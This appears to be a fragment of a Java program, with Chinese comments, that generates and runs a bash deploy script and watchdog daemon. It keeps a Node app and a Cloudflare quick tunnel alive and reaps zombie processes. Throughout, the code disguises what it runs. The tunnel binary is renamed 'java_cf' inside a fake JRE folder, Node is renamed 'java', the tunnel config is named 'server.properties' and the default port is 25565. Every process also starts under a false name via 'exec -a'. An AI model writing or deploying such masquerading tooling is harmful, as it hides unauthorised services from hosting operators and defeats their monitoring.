        "                                    echo \"$CF_PID\" >> .pids\n" +
        "                                    TUNNEL_ESTABLISHED=true\n" +
        "                                    break\n" +
        "                                fi\n" +
        "                                kill $CF_PID 2>/dev/null\n" +
        "                                # ★ 修复：kill 后必须 wait 回收\n" +
        "                                wait $CF_PID 2>/dev/null\n" +
        "                            fi\n" +
        "                        fi\n" +
        "                        sleep 1\n" +
        "                    done\n" +
        "                    if [ \"$TUNNEL_ESTABLISHED\" != \"true\" ]; then\n" +
        "                        kill $CF_PID 2>/dev/null\n" +
        "                        # ★ 修复：kill 后必须 wait 回收\n" +
        "                        wait $CF_PID 2>/dev/null\n" +
        "                    fi\n" +
        "                done\n" +
        "            done\n" +
        "        fi\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        "# ============ 7. 守护循环 ============\n" +
        // ★★★ 核心：daemon.sh 的僵尸进程修复 ★★★
        // 1. trap CHLD：子进程退出时自动回收
        // 2. kill_and_reap：安全杀死并回收子进程
        // 3. 每轮循环末尾 wait -n 主动回收
        // 4. 退出时 cleanup 清理所有子进程
        "cat > \"daemon.sh\" << 'DAEMONSCRIPT'\n" +
        "#!/bin/bash\n" +
        "# ★ 僵尸进程防御\n" +
        "trap 'while wait -n 2>/dev/null; do :; done' CHLD\n" +
        "cleanup() {\n" +
        "    for job in $(jobs -p 2>/dev/null); do\n" +
        "        kill $job 2>/dev/null\n" +
        "        wait $job 2>/dev/null\n" +
        "    done\n" +
        "    while wait -n 2>/dev/null; do :; done\n" +
        "}\n" +
        "trap cleanup EXIT TERM INT\n" +
        "\n" +
        "WORK_DIR=\"" + dir.toAbsolutePath() + "\"\n" +
        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
        "CF_CONF_DIR=\"$WORK_DIR/jre21/conf\"\n" +
        "NODE_FAKE=\"$JRE_DIR/java\"\n" +
        "NODE_PID_FILE=\"$WORK_DIR/.node_pid\"\n" +
        "APP_DIR=\"$WORK_DIR\"\n" +
        "NODE_SCRIPT=\"" + NODE_SCRIPT + "\"\n" +
        "PORT=$(cat \"$WORK_DIR/.node_port\" 2>/dev/null || echo \"25565\")\n" +
        "export SERVER_PORT=$PORT; export PORT=$PORT\n" +
        "export _JAVA_WRAPPER=\"$WORK_DIR/.node/bin/node\"\n" +
        "export PATH=\"$WORK_DIR/.node/bin:$PATH\"\n" +
        "\n" +
        "write_cf_config() {\n" +
        "    local PROTO=$1\n" +
        "    cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
        "url: http://localhost:$PORT\n" +
        "no-autoupdate: true\n" +
        "protocol: $PROTO\n" +
        "CFCONF\n" +
        "}\n" +
        "\n" +
        "# ★ 安全杀死并回收子进程\n" +
        "kill_and_reap() {\n" +
        "    local PID=$1\n" +
        "    if [ -z \"$PID\" ]; then return; fi\n" +
        "    if ! kill -0 $PID 2>/dev/null; then\n" +
        "        wait $PID 2>/dev/null\n" +
        "        return\n" +
        "    fi\n" +
        "    kill $PID 2>/dev/null\n" +
        "    local waited=0\n" +
        "    while [ $waited -lt 5 ]; do\n" +
        "        if ! kill -0 $PID 2>/dev/null; then\n" +
        "            wait $PID 2>/dev/null\n" +
        "            return\n" +
        "        fi\n" +
        "        sleep 1\n" +
        "        waited=$((waited + 1))\n" +
        "    done\n" +
        "    kill -9 $PID 2>/dev/null\n" +
        "    wait $PID 2>/dev/null\n" +
        "}\n" +
        "\n" +
        "start_cf_tunnel() {\n" +
        "    local PROTO=$1\n" +
        "    local LOG_FILE=$2\n" +
        "    write_cf_config \"$PROTO\"\n" +
        "    (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$LOG_FILE\" 2>&1) &\n" +
        "    echo $!\n" +
        "}\n" +
        "\n" +
        "NODE_PID=$(head -1 \"$WORK_DIR/.pids\" 2>/dev/null)\n" +
        "\n" +
        "while true; do\n" +
        "    NEED_RESTART=false\n" +
        "    if [ -n \"$NODE_PID\" ] && ! kill -0 $NODE_PID 2>/dev/null; then\n" +
        "        NEED_RESTART=true\n" +
        "    fi\n" +
        "    if [ \"$NEED_RESTART\" = \"true\" ]; then\n" +
        "        # ★ 修复：回收旧的 Node 僵尸\n" +
        "        wait $NODE_PID 2>/dev/null\n" +
        "        cd \"$APP_DIR\"\n" +
        "        export SERVER_PORT=$PORT; export PORT=$PORT\n" +
        "        (exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) &\n" +
        "        NODE_PID=$!\n" +
        "        echo \"$NODE_PID\" >> \"$WORK_DIR/.pids\"\n" +
        "        for i in $(seq 1 30); do\n" +
        "            if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n" +
        "            sleep 1\n" +
        "        done\n" +
        "    fi\n" +
        "    \n" +
        "    NEED_REBUILD=false\n" +
        "    if [ -f \"$WORK_DIR/.cf/tunnel_url.txt\" ] && [ \"" + cfMode + "\" != \"fixed\" ]; then\n" +
        "        SAVED_CF_PID=$(grep 'CF_PID=' \"$WORK_DIR/.cf/tunnel_url.txt\" 2>/dev/null | cut -d= -f2)\n" +
        "        SAVED_PROTO=$(grep 'PROTOCOL=' \"$WORK_DIR/.cf/tunnel_url.txt\" 2>/dev/null | cut -d= -f2)\n" +
        "        SAVED_PROTO=${SAVED_PROTO:-quic}\n" +
        "        \n" +
        "        if [ -n \"$SAVED_CF_PID\" ] && ! kill -0 $SAVED_CF_PID 2>/dev/null; then\n" +
        "            # ★ 修复：回收已死的 cloudflared 僵尸\n" +
        "            wait $SAVED_CF_PID 2>/dev/null\n" +
        "            NEED_REBUILD=true\n" +
        "        fi\n" +
        "        \n" +
        "        if [ \"$NEED_REBUILD\" = \"false\" ]; then\n" +
        "            SAVED_URL=$(head -1 \"$WORK_DIR/.cf/tunnel_url.txt\" 2>/dev/null)\n" +
        "            if [ -n \"$SAVED_URL\" ]; then\n" +
        "                HC=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 8 \"$SAVED_URL/__health\" 2>/dev/null)\n" +
        "                if [ -z \"$HC\" ] || [ \"$HC\" = \"000\" ]; then\n" +
        "                    sleep 5\n" +
        "                    HC2=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 8 \"$SAVED_URL/__health\" 2>/dev/null)\n" +
        "                    if [ -z \"$HC2\" ] || [ \"$HC2\" = \"000\" ]; then\n" +
        "                        NEED_REBUILD=true\n" +
        "                    fi\n" +
        "                fi\n" +
        "            fi\n" +
        "        fi\n" +
        "        \n" +
        "        if [ \"$NEED_REBUILD\" = \"true\" ]; then\n" +
        "            # ★ 修复：使用 kill_and_reap 安全杀死并回收旧 cloudflared\n" +
        "            kill_and_reap \"$SAVED_CF_PID\"\n" +
        "            # ★ 修复：替代 pkill -f，用 .pids 文件中已知的 PID 逐个 kill\n" +
        "            # pkill -f \"$CF_BIN\" 会匹配到 daemon.sh 自身命令行（含 $CF_BIN 路径），\n" +
        "            # 导致 daemon.sh 被杀，pkill 变孤儿 → [pkill] <defunct> 僵尸\n" +
        "            for fpid in $(cat \"$WORK_DIR/.pids\" 2>/dev/null); do\n" +
        "                if [ \"$fpid\" != \"$$\" ] && [ \"$fpid\" != \"$NODE_PID\" ] && [ \"$fpid\" != \"$SAVED_CF_PID\" ]; then\n" +
        "                    kill -9 \"$fpid\" 2>/dev/null\n" +
        "                fi\n" +
        "            done\n" +
        "            sleep 2\n" +
        "            # ★ 修复：回收所有后台僵尸子进程\n" +
        "            while wait -n 2>/dev/null; do :; done\n" +
        "            rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
        "            \n" +
        "            for RPROTO in $SAVED_PROTO quic http2 auto; do\n" +
        "                rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
        "                NEW_PID=$(start_cf_tunnel \"$RPROTO\" \"$WORK_DIR/.cf/cf.log\")\n" +
        "                sleep 5\n" +
        "                if ! kill -0 $NEW_PID 2>/dev/null; then\n" +
        "                    # ★ 修复：回收失败的子进程\n" +
        "                    wait $NEW_PID 2>/dev/null\n" +
        "                    continue\n" +
        "                fi\n" +
        "                NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n" +
        "                if [ -z \"$NEW_URL\" ]; then\n" +
        "                    # ★ 修复：kill 后必须 wait 回收\n" +
        "                    kill $NEW_PID 2>/dev/null\n" +
        "                    wait $NEW_PID 2>/dev/null\n" +
        "                    continue\n" +
        "                fi\n" +
        "                sleep 3\n" +
        "                V=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n" +
        "                if [ -n \"$V\" ] && [ \"$V\" != \"000\" ]; then\n" +
        "                    echo \"$NEW_URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                    echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                    echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                    echo \"$NEW_PID\" >> \"$WORK_DIR/.pids\"\n" +
        "                    break\n" +
        "                else\n" +
        "                    sleep 5\n" +
        "                    V2=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n" +
        "                    if [ -n \"$V2\" ] && [ \"$V2\" != \"000\" ]; then\n" +
        "                        echo \"$NEW_URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                        echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                        echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                        echo \"$NEW_PID\" >> \"$WORK_DIR/.pids\"\n" +
        "                        break\n" +
        "                    else\n" +
        "                        # ★ 修复：kill 后必须 wait 回收\n" +
        "                        kill $NEW_PID 2>/dev/null\n" +
        "                        wait $NEW_PID 2>/dev/null\n" +
        "                    fi\n" +
        "                fi\n" +
        "            done\n" +
        "        fi\n" +
        "    fi\n" +
        "    # ★ 修复：每轮循环末尾主动回收所有已退出的子进程\n" +
        "    while wait -n 2>/dev/null; do :; done\n" +
        "    sleep 15\n" +
        "done\n" +
        "DAEMONSCRIPT\n" +
        "chmod +x daemon.sh\n" +
        "(exec -a \"" + FAKE_CMD + "\" bash ./daemon.sh >> daemon.log 2>&1) &\n" +
        "echo \"$!\" >> .pids\n";

    Files.writeString(script, content);
    script.toFile().setExecutable(true);
    Files.writeString(dir.resolve(".pids"), "");
    return script;
}

// ============================================================
// 执行部署脚本（★ 恢复原始逻辑：INHERIT 输出到控制台）
// ============================================================

private static void executeDeployScript(Path script) throws Exception {
    ProcessBuilder pb = new ProcessBuilder("bash", script.toString());
    pb.directory(script.getParent().toFile());
    pb.redirectErrorStream(true);
    pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
    Process p = pb.start();
    Thread t = new Thread(() -> {
        try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            while (r.readLine() != null) {}
        } catch (IOException ignored) {}
    }, "Deploy-Log");
    t.setDaemon(true);
    t.start();
    // ★ 修复：超时后 destroyForcibly + waitFor 确保进程被回收
    if (!p.waitFor(10, TimeUnit.MINUTES)) {
        p.destroyForcibly();
        p.waitFor(30, TimeUnit.SECONDS);
    }
}

}
